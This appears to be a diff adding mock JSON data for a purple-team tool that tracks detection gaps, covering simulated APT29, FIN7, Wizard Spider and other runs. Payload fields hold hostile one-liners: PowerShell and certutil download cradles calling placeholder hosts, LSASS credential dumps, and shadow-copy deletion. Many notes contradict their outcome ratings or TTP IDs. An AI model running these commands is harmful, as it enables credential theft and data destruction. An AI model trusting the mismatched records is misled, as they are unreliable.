+      "createdDate": "2026-05-05T21:49:33.277Z",
+      "resolvedDate": "2026-05-27T08:48:30.780Z",
+      "resolutionNotes": "Configured Azure AD Conditional Access to block legacy authentication protocols.",
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Server"
+      ],
+      "ticketLink": "JIRA-7181",
+      "details": "Execution: Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.\nDetection: Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered."
+    },
+    {
+      "id": "90014",
+      "displayId": "GAP-8296",
+      "ttp": "T1090.001",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1090.001",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "In Progress",
+      "severity": "High",
+      "priorityScore": 70,
+      "createdDate": "2026-05-09T17:55:24.855Z",
+      "resolvedDate": null,
+      "resolutionNotes": null,
+      "actionItems": "Engineer a new detection rule in the SIEM for this activity.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Linux"
+      ],
+      "ticketLink": "JIRA-1688",
+      "details": "Execution: Modified registry keys to achieve persistence via Run keys. Validated survival after reboot.\nDetection: No alert generated in SIEM. Found evidence of execution in Sysmon Event ID 1 during retrospective hunt."
+    },
+    {
+      "id": "90015",
+      "displayId": "GAP-1337",
+      "ttp": "T1548.002",
+      "simulation": "APT33 Simulation (March 2026 Run 2)",
+      "finding": "APT33 Simulation - Simulated Execution of T1548.002",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Resolved",
+      "severity": "High",
+      "priorityScore": 70,
+      "createdDate": "2026-03-14T22:45:07.317Z",
+      "resolvedDate": "2026-03-24T05:03:29.688Z",
+      "resolutionNotes": "Updated Splunk correlation search to detect this specific command line argument.",
+      "actionItems": "Review and tune EDR prevention policies for this host group.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Linux"
+      ],
+      "ticketLink": "JIRA-3089",
+      "details": "Execution: Dumped LSASS memory using procdump.exe. File saved to C:\\Temp\\lsass.dmp.\nDetection: Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response."
+    },
+    {
+      "id": "90016",
+      "displayId": "GAP-6962",
+      "ttp": "T1005",
+      "simulation": "APT33 Simulation (March 2026 Run 2)",
+      "finding": "APT33 Simulation - Simulated Execution of T1005",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Risk Accepted",
+      "severity": "High",
+      "priorityScore": 70,
+      "createdDate": "2026-03-11T05:44:04.359Z",
+      "resolvedDate": null,
+      "resolutionNotes": null,
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Linux"
+      ],
+      "ticketLink": "JIRA-5222",
+      "details": "Execution: Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.\nDetection: EDR alerted on suspicious PowerShell activity. Analyst triaged and isolated host within 15 minutes."
+    },
+    {
+      "id": "90017",
+      "displayId": "GAP-1001",
+      "ttp": "T1133",
+      "simulation": "APT33 Simulation (April 2026 Run 3)",
+      "finding": "APT33 Simulation - Simulated Execution of T1133",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "In Progress",
+      "severity": "Medium",
+      "priorityScore": 50,
+      "createdDate": "2026-05-01T08:30:16.065Z",
+      "resolvedDate": null,
+      "resolutionNotes": null,
+      "actionItems": "Patch the vulnerable application to the latest version.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Server"
+      ],
+      "ticketLink": "JIRA-2572",
+      "details": "Execution: Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.\nDetection: No alert generated in SIEM. Found evidence of execution in Sysmon Event ID 1 during retrospective hunt."
+    },
+    {
+      "id": "90018",
+      "displayId": "GAP-4434",
+      "ttp": "T1068",
+      "simulation": "APT33 Simulation (April 2026 Run 3)",
+      "finding": "APT33 Simulation - Simulated Execution of T1068",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Resolved",
+      "severity": "Critical",
+      "priorityScore": 90,
+      "createdDate": "2026-05-01T08:32:38.049Z",
+      "resolvedDate": "2026-05-10T00:33:29.985Z",
+      "resolutionNotes": "Enabled MFA enforcement across all external facing applications.",
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Server"
+      ],
+      "ticketLink": "JIRA-5434",
+      "details": "Execution: Attempted lateral movement via WMI to domain controller. Access denied due to lack of privileges.\nDetection: Detected registry modification via Carbon Black, but alert was buried under low-fidelity noise."
+    },
+    {
+      "id": "90019",
+      "displayId": "GAP-8455",
+      "ttp": "T1548.002",
+      "simulation": "APT33 Simulation (April 2026 Run 3)",
+      "finding": "APT33 Simulation - Simulated Execution of T1548.002",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Resolved",
+      "severity": "Low",
+      "priorityScore": 50,
+      "createdDate": "2026-05-03T01:44:13.441Z",
+      "resolvedDate": "2026-05-15T06:11:32.942Z",
+      "resolutionNotes": "Deployed WDAC policy to block unsigned scripts in the environment.",
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Server"
+      ],
+      "ticketLink": "JIRA-3285",
+      "details": "Execution: Attempted to bypass UAC using fodhelper.exe. Command executed as standard user but failed to elevate privileges.\nDetection: EDR alerted on suspicious PowerShell activity. Analyst triaged and isolated host within 15 minutes."
+    }
+  ],
+  "simulationSummaries": {
+    "APT29 Emulation (January 2026 Run 1)": {
+      "summary": "## Executive Summary\nThis simulation tested the organization's defenses against APT29 Emulation TTPs. Results were mixed, highlighting key areas for improvement.\n\n## Key Findings\nSeveral critical detection gaps were identified during execution.\n\n## Risk Analysis\nUnmitigated gaps could allow threat actors to establish persistence undetected.\n\n## Recommendations\nImplement stronger network segmentation and enhance EDR logging.",
+      "details": {
+        "name": "APT29 Emulation (January 2026 Run 1)",
+        "environmentCategory": [
+          "Windows Workstation",
+          "Windows Server",
+          "Azure / Entra ID"
+        ],
+        "goals": "Validate defensive posture against APT29 Emulation",
+        "participants": [
+          {
+            "name": "Blue Team",
+            "role": "SOC"
+          },
+          {
+            "name": "Red Team",
+            "role": "Adversary Emulation"
+          }
+        ]
+      },
+      "attackChain": [],
+      "testResults": [
+        {
+          "id": "50000",
+          "name": "APT29 Emulation - Simulated Execution of T1566.001",
+          "outcome": "Alerted",
+          "coverageRating": "Partial",
+          "severity": "Low",
+          "ttps": [
+            "T1566.001"
+          ],
+          "execNotes": "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
+          "detNotes": "Analyst noted abnormal volume of DNS requests to a newly registered domain. Created custom detection rule.",
+          "payloadCode": "schtasks /create /tn \"WindowsUpdater\" /tr \"C:\\Temp\\payload.exe\" /sc onlogon /ru System",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50001",
+          "name": "APT29 Emulation - Simulated Execution of T1059.001",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1059.001"
+          ],
+          "execNotes": "Injected shellcode into explorer.exe to evade detection. C2 connection established.",
+          "detNotes": "Activity completely bypassed EDR. No telemetry available on the endpoint.",
+          "payloadCode": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateTask\" /t REG_SZ /d \"C:\\Temp\\malware.exe\" /f",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50002",
+          "name": "APT29 Emulation - Simulated Execution of T1071.001",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1071.001"
+          ],
+          "execNotes": "Injected shellcode into explorer.exe to evade detection. C2 connection established.",
+          "detNotes": "Windows Defender flagged the file as malicious and quarantined it immediately.",
+          "payloadCode": "bitsadmin /transfer myDownloadJob /download /priority normal http://malicious.com/payload.exe C:\\Temp\\payload.exe",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50003",
+          "name": "APT29 Emulation - Simulated Execution of T1078",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "Critical",
+          "ttps": [
+            "T1078"
+          ],
+          "execNotes": "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
+          "detNotes": "Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response.",
+          "payloadCode": "powershell.exe -nop -exec bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/payload.ps1')\"",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50004",
+          "name": "APT29 Emulation - Simulated Execution of T1003.001",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "Critical",
+          "ttps": [
+            "T1003.001"
+          ],
+          "execNotes": "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
+          "detNotes": "CrowdStrike blocked the execution of SharpHound. Generated High severity incident.",
+          "payloadCode": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 600 C:\\Temp\\lsass.dmp full",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50005",
+          "name": "APT29 Emulation - Simulated Execution of T1569.002",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1569.002"
+          ],
+          "execNotes": "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
+          "detNotes": "EDR alerted on suspicious PowerShell activity. Analyst triaged and isolated host within 15 minutes.",
+          "payloadCode": "schtasks /create /tn \"WindowsUpdater\" /tr \"C:\\Temp\\payload.exe\" /sc onlogon /ru System",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50006",
+          "name": "APT29 Emulation - Simulated Execution of T1021.001",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1021.001"
+          ],
+          "execNotes": "Ran simulated ransomware payload. 500 files encrypted before process crashed.",
+          "detNotes": "No alert generated in SIEM. Found evidence of execution in Sysmon Event ID 1 during retrospective hunt.",
+          "payloadCode": "powershell.exe -nop -exec bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/payload.ps1')\"",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        }
+      ],
+      "timestamp": "2026-01-24T13:31:13.168Z"
+    },
+    "FIN7 Campaign (February 2026 Run 1)": {
+      "summary": "## Executive Summary\nThis simulation tested the organization's defenses against FIN7 Campaign TTPs. Results were mixed, highlighting key areas for improvement.\n\n## Key Findings\nSeveral critical detection gaps were identified during execution.\n\n## Risk Analysis\nUnmitigated gaps could allow threat actors to establish persistence undetected.\n\n## Recommendations\nImplement stronger network segmentation and enhance EDR logging.",
+      "details": {
+        "name": "FIN7 Campaign (February 2026 Run 1)",
+        "environmentCategory": [
+          "Windows Server",
+          "Linux"
+        ],
+        "goals": "Validate defensive posture against FIN7 Campaign",
+        "participants": [
+          {
+            "name": "Blue Team",
+            "role": "SOC"
+          },
+          {
+            "name": "Red Team",
+            "role": "Adversary Emulation"
+          }
+        ]
+      },
+      "attackChain": [],
+      "testResults": [
+        {
+          "id": "50007",
+          "name": "FIN7 Campaign - Simulated Execution of T1190",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1190"
+          ],
+          "execNotes": "Ran BloodHound ingestor (SharpHound.exe) from compromised endpoint. Mapped full AD domain.",
+          "detNotes": "Activity completely bypassed EDR. No telemetry available on the endpoint.",
+          "payloadCode": "procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50008",
+          "name": "FIN7 Campaign - Simulated Execution of T1059.003",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1059.003"
+          ],
+          "execNotes": "Attempted to bypass UAC using fodhelper.exe. Command executed as standard user but failed to elevate privileges.",
+          "detNotes": "Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered.",
+          "payloadCode": "vssadmin.exe Delete Shadows /All /Quiet",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50009",
+          "name": "FIN7 Campaign - Simulated Execution of T1110.001",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "Low",
+          "ttps": [
+            "T1110.001"
+          ],
+          "execNotes": "Modified registry keys to achieve persistence via Run keys. Validated survival after reboot.",
+          "detNotes": "CrowdStrike blocked the execution of SharpHound. Generated High severity incident.",
+          "payloadCode": "vssadmin.exe Delete Shadows /All /Quiet",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50010",
+          "name": "FIN7 Campaign - Simulated Execution of T1087.001",
+          "outcome": "Missed",
+          "coverageRating": "None",
+          "severity": "High",
+          "ttps": [
+            "T1087.001"
+          ],
+          "execNotes": "Attempted to bypass UAC using fodhelper.exe. Command executed as standard user but failed to elevate privileges.",
+          "detNotes": "Windows Defender flagged the file as malicious and quarantined it immediately.",
+          "payloadCode": "wmic process call create \"cmd.exe /c calc.exe\"",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50011",
+          "name": "FIN7 Campaign - Simulated Execution of T1021.002",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1021.002"
+          ],
+          "execNotes": "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
+          "detNotes": "Activity completely bypassed EDR. No telemetry available on the endpoint.",
+          "payloadCode": "SharpHound.exe -c All -d target.local --domaincontroller 192.168.1.100",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50012",
+          "name": "FIN7 Campaign - Simulated Execution of T1048.002",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1048.002"
+          ],
+          "execNotes": "Modified registry keys to achieve persistence via Run keys. Validated survival after reboot.",
+          "detNotes": "Authentication logs show successful logon from unusual IP. Conditional Access policy did not block it.",
+          "payloadCode": "bitsadmin /transfer myDownloadJob /download /priority normal http://malicious.com/payload.exe C:\\Temp\\payload.exe",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        }
+      ],
+      "timestamp": "2026-02-17T17:23:29.413Z"
+    },
+    "Scattered Spider Emulation (February 2026 Run 1)": {
+      "summary": "## Executive Summary\nThis simulation tested the organization's defenses against Scattered Spider Emulation TTPs. Results were mixed, highlighting key areas for improvement.\n\n## Key Findings\nSeveral critical detection gaps were identified during execution.\n\n## Risk Analysis\nUnmitigated gaps could allow threat actors to establish persistence undetected.\n\n## Recommendations\nImplement stronger network segmentation and enhance EDR logging.",
+      "details": {
+        "name": "Scattered Spider Emulation (February 2026 Run 1)",
+        "environmentCategory": [
+          "Azure / Entra ID",
+          "macOS",
+          "Windows Workstation"
+        ],
+        "goals": "Validate defensive posture against Scattered Spider Emulation",
+        "participants": [
+          {
+            "name": "Blue Team",
+            "role": "SOC"
+          },
+          {
+            "name": "Red Team",
+            "role": "Adversary Emulation"
+          }
+        ]
+      },
+      "attackChain": [],
+      "testResults": [
+        {
+          "id": "50013",
+          "name": "Scattered Spider Emulation - Simulated Execution of T1078.004",
+          "outcome": "Missed",
+          "coverageRating": "None",
+          "severity": "Critical",
+          "ttps": [
+            "T1078.004"
+          ],
+          "execNotes": "Injected shellcode into explorer.exe to evade detection. C2 connection established.",
+          "detNotes": "Detected registry modification via Carbon Black, but alert was buried under low-fidelity noise.",
+          "payloadCode": "SharpHound.exe -c All -d target.local --domaincontroller 192.168.1.100",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50014",
+          "name": "Scattered Spider Emulation - Simulated Execution of T1098",
+          "outcome": "Alerted",
+          "coverageRating": "Partial",
+          "severity": "Low",
+          "ttps": [
+            "T1098"
+          ],
+          "execNotes": "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
+          "detNotes": "Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered.",
+          "payloadCode": "powershell.exe -nop -exec bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/payload.ps1')\"",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50015",
+          "name": "Scattered Spider Emulation - Simulated Execution of T1566.002",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1566.002"
+          ],
+          "execNotes": "Ran simulated ransomware payload. 500 files encrypted before process crashed.",
+          "detNotes": "EDR alerted on suspicious PowerShell activity. Analyst triaged and isolated host within 15 minutes.",
+          "payloadCode": "wmic process call create \"cmd.exe /c calc.exe\"",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50016",
+          "name": "Scattered Spider Emulation - Simulated Execution of T1562.001",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1562.001"
+          ],
+          "execNotes": "Attempted to bypass UAC using fodhelper.exe. Command executed as standard user but failed to elevate privileges.",
+          "detNotes": "Detected registry modification via Carbon Black, but alert was buried under low-fidelity noise.",
+          "payloadCode": "procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50017",
+          "name": "Scattered Spider Emulation - Simulated Execution of T1070.004",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1070.004"
+          ],
+          "execNotes": "Ran BloodHound ingestor (SharpHound.exe) from compromised endpoint. Mapped full AD domain.",
+          "detNotes": "Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response.",
+          "payloadCode": "SharpHound.exe -c All -d target.local --domaincontroller 192.168.1.100",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        }
+      ],
+      "timestamp": "2026-02-08T14:41:58.202Z"
+    },
+    "Wizard Spider Ransomware (February 2026 Run 1)": {
+      "summary": "## Executive Summary\nThis simulation tested the organization's defenses against Wizard Spider Ransomware TTPs. Results were mixed, highlighting key areas for improvement.\n\n## Key Findings\nSeveral critical detection gaps were identified during execution.\n\n## Risk Analysis\nUnmitigated gaps could allow threat actors to establish persistence undetected.\n\n## Recommendations\nImplement stronger network segmentation and enhance EDR logging.",
+      "details": {
+        "name": "Wizard Spider Ransomware (February 2026 Run 1)",
+        "environmentCategory": [
+          "Windows Server",
+          "Windows Workstation"
+        ],
+        "goals": "Validate defensive posture against Wizard Spider Ransomware",
+        "participants": [
+          {
+            "name": "Blue Team",
+            "role": "SOC"
+          },
+          {
+            "name": "Red Team",
+            "role": "Adversary Emulation"
+          }
+        ]
+      },
+      "attackChain": [],
+      "testResults": [
+        {
+          "id": "50018",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1566",
+          "outcome": "Missed",
+          "coverageRating": "None",
+          "severity": "High",
+          "ttps": [
+            "T1566"
+          ],
+          "execNotes": "Injected shellcode into explorer.exe to evade detection. C2 connection established.",
+          "detNotes": "No alert generated in SIEM. Found evidence of execution in Sysmon Event ID 1 during retrospective hunt.",
+          "payloadCode": "certutil.exe -urlcache -split -f http://malicious.com/payload.exe C:\\Windows\\Temp\\payload.exe",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50019",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1204.002",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1204.002"
+          ],
+          "execNotes": "Ran BloodHound ingestor (SharpHound.exe) from compromised endpoint. Mapped full AD domain.",
+          "detNotes": "Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered.",
+          "payloadCode": "schtasks /create /tn \"WindowsUpdater\" /tr \"C:\\Temp\\payload.exe\" /sc onlogon /ru System",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50020",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1053.005",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1053.005"
+          ],
+          "execNotes": "Ran simulated ransomware payload. 500 files encrypted before process crashed.",
+          "detNotes": "Windows Defender flagged the file as malicious and quarantined it immediately.",
+          "payloadCode": "wmic process call create \"cmd.exe /c calc.exe\"",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50021",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1486",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "Medium",
+          "ttps": [
+            "T1486"
+          ],
+          "execNotes": "Executed PowerShell download cradle to pull secondary payload. Payload failed to execute due to execution policy.",
+          "detNotes": "Analyst noted abnormal volume of DNS requests to a newly registered domain. Created custom detection rule.",
+          "payloadCode": "schtasks /create /tn \"WindowsUpdater\" /tr \"C:\\Temp\\payload.exe\" /sc onlogon /ru System",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50022",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1490",
+          "outcome": "Alerted",
+          "coverageRating": "Partial",
+          "severity": "Low",
+          "ttps": [
+            "T1490"
+          ],
+          "execNotes": "Injected shellcode into explorer.exe to evade detection. C2 connection established.",
+          "detNotes": "Authentication logs show successful logon from unusual IP. Conditional Access policy did not block it.",
+          "payloadCode": "vssadmin.exe Delete Shadows /All /Quiet",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50023",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1114.002",
+          "outcome": "Missed",
+          "coverageRating": "None",
+          "severity": "High",
+          "ttps": [
+            "T1114.002"
+          ],
+          "execNotes": "Ran simulated ransomware payload. 500 files encrypted before process crashed.",
+          "detNotes": "Authentication logs show successful logon from unusual IP. Conditional Access policy did not block it.",
+          "payloadCode": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 600 C:\\Temp\\lsass.dmp full",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        }
+      ],
+      "timestamp": "2026-02-20T16:30:15.395Z"
+    },
+    "Wizard Spider Ransomware (April 2026 Run 2)": {
+      "summary": "## Executive Summary\nThis simulation tested the organization's defenses against Wizard Spider Ransomware TTPs. Results were mixed, highlighting key areas for improvement.\n\n## Key Findings\nSeveral critical detection gaps were identified during execution.\n\n## Risk Analysis\nUnmitigated gaps could allow threat actors to establish persistence undetected.\n\n## Recommendations\nImplement stronger network segmentation and enhance EDR logging.",
+      "details": {
+        "name": "Wizard Spider Ransomware (April 2026 Run 2)",
+        "environmentCategory": [
+          "Windows Server",
+          "Windows Workstation"
+        ],
+        "goals": "Validate defensive posture against Wizard Spider Ransomware",
+        "participants": [
+          {
+            "name": "Blue Team",
+            "role": "SOC"
+          },
+          {
+            "name": "Red Team",
+            "role": "Adversary Emulation"
+          }
+        ]
+      },
+      "attackChain": [],
+      "testResults": [
+        {
+          "id": "50024",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1566",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1566"
+          ],
+          "execNotes": "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
+          "detNotes": "Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response.",
+          "payloadCode": "wmic process call create \"cmd.exe /c calc.exe\"",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50025",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1204.002",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "Critical",
+          "ttps": [
+            "T1204.002"
+          ],
+          "execNotes": "Injected shellcode into explorer.exe to evade detection. C2 connection established.",
+          "detNotes": "Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered.",
+          "payloadCode": "powershell.exe -nop -exec bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/payload.ps1')\"",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50026",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1053.005",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "High",
+          "ttps": [
+            "T1053.005"
+          ],
+          "execNotes": "Dumped LSASS memory using procdump.exe. File saved to C:\\Temp\\lsass.dmp.",
+          "detNotes": "Windows Defender flagged the file as malicious and quarantined it immediately.",
+          "payloadCode": "certutil.exe -urlcache -split -f http://malicious.com/payload.exe C:\\Windows\\Temp\\payload.exe",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50027",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1486",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1486"
+          ],
+          "execNotes": "Dumped LSASS memory using procdump.exe. File saved to C:\\Temp\\lsass.dmp.",
+          "detNotes": "Authentication logs show successful logon from unusual IP. Conditional Access policy did not block it.",
+          "payloadCode": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 600 C:\\Temp\\lsass.dmp full",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50028",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1490",
+          "outcome": "Missed",
+          "coverageRating": "None",
+          "severity": "Medium",
+          "ttps": [
+            "T1490"
+          ],
+          "execNotes": "Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.",
+          "detNotes": "Windows Defender flagged the file as malicious and quarantined it immediately.",
+          "payloadCode": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateTask\" /t REG_SZ /d \"C:\\Temp\\malware.exe\" /f",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50029",
+          "name": "Wizard Spider Ransomware - Simulated Execution of T1114.002",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1114.002"
+          ],
+          "execNotes": "Injected shellcode into explorer.exe to evade detection. C2 connection established.",
+          "detNotes": "Windows Defender flagged the file as malicious and quarantined it immediately.",
+          "payloadCode": "powershell.exe -nop -exec bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/payload.ps1')\"",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        }
+      ],
+      "timestamp": "2026-04-19T21:33:11.671Z"
+    },
+    "APT33 Simulation (May 2026 Run 1)": {
+      "summary": "## Executive Summary\nThis simulation tested the organization's defenses against APT33 Simulation TTPs. Results were mixed, highlighting key areas for improvement.\n\n## Key Findings\nSeveral critical detection gaps were identified during execution.\n\n## Risk Analysis\nUnmitigated gaps could allow threat actors to establish persistence undetected.\n\n## Recommendations\nImplement stronger network segmentation and enhance EDR logging.",
+      "details": {
+        "name": "APT33 Simulation (May 2026 Run 1)",
+        "environmentCategory": [
+          "Linux",
+          "Windows Server"
+        ],
+        "goals": "Validate defensive posture against APT33 Simulation",
+        "participants": [
+          {
+            "name": "Blue Team",
+            "role": "SOC"
+          },
+          {
+            "name": "Red Team",
+            "role": "Adversary Emulation"
+          }
+        ]
+      },
+      "attackChain": [],
+      "testResults": [
+        {
+          "id": "50030",
+          "name": "APT33 Simulation - Simulated Execution of T1133",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1133"
+          ],
+          "execNotes": "Attempted to bypass UAC using fodhelper.exe. Command executed as standard user but failed to elevate privileges.",
+          "detNotes": "Detected registry modification via Carbon Black, but alert was buried under low-fidelity noise.",
+          "payloadCode": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateTask\" /t REG_SZ /d \"C:\\Temp\\malware.exe\" /f",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50031",
+          "name": "APT33 Simulation - Simulated Execution of T1543.003",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "Critical",
+          "ttps": [
+            "T1543.003"
+          ],
+          "execNotes": "Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.",
+          "detNotes": "EDR alerted on suspicious PowerShell activity. Analyst triaged and isolated host within 15 minutes.",
+          "payloadCode": "SharpHound.exe -c All -d target.local --domaincontroller 192.168.1.100",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50032",
+          "name": "APT33 Simulation - Simulated Execution of T1068",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1068"
+          ],
+          "execNotes": "Attempted lateral movement via WMI to domain controller. Access denied due to lack of privileges.",
+          "detNotes": "Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response.",
